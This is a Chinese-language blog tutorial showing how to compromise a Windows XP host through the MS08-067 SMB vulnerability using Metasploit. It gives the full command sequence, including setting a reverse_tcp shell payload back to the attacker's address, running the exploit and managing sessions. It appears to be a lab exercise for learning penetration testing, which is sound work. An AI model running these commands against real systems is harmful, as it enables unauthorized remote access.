---
title: "使用msf渗透攻击XP系统"
date: 2020-02-21T17:42:53+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

metasploit框架渗透攻击XP系统

<!--more-->



##  exploit渗透攻击模块的整体使用流程

![](http://junmoxiao.org.cn/20200221174807.png)

##  ms08-067漏洞攻击实施步骤

* 关闭XP系统防火墙

  ![](http://junmoxiao.org.cn/20200221182247.png)

* 搜索ms08-067漏洞的相关模块

~~~
search ms08-067
~~~

* 加载渗透攻击模块

  ~~~
  use exploit/windows/smb/ms08_067_netapi
  ~~~

  * 查询渗透攻击相关说明

    ~~~
    info
    ~~~

    > 该模块利用路径规范化中的解析缺陷服务器服务通过NetAPI32.dll的代码。这个模块是能够绕过某些操作系统和Service Pack上的NX。必须使用正确的目标来阻止服务器服务（以及与十多个其他对象在同一过程中）崩溃。Windows XP目标似乎可以处理多个成功的利用事件，但是2003目标通常会崩溃或在随后的尝试中挂起。这个只是该模块的第一个版本，完全支持NX旁路在2003年以及其他平台上，仍在开发中。

* 查询可用参数

~~~
show options
~~~

* 设置目标IP地址

  ~~~
  set RHOSTS 192.168.1.54
  ~~~

  * 查询可用目标机类型

    show targets

    db_nmap -O 192.168.1.54

* 设置目标机类型

  ~~~
  set target 34
  ~~~

>payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接，可返回 shell，也可以进行行程序注入等

* 找一个 payload，获取shell远程权限后，进行远程执行命令

~~~
search /windows/shell type:payload
set payload windows/shell/reverse_tcp
~~~

* 设置源IP地址和端口用来接收返回的shell

~~~
set LHOST 192.168.1.130
~~~

* 执行渗透攻击

~~~
run
~~~

![](http://junmoxiao.org.cn/20200221184921.png)

* Run in the context of a job 后台执行 渗透目标完成后会创建一个 session 我们可以通过 session 连接目标主机

  ~~~
  exploit -j
  ~~~

  * 通过ID进行访问远程目标机

    ~~~
     sessions -i ID
    ~~~

* 退出会话将会话保存到后台

  ~~~
  background
  ~~~

  

## 渗透攻击步骤

1、查找 CVE公布的漏洞  search name: 

2、查找对应的 auxiliary/exploit模块 

3、查询信息和配置模块参数 

4、添加 payload后门返回shell

 5、执行 exploit 开始攻击 

 6、建立sessions会话连接

 7、执行命令和后台运行[可选]

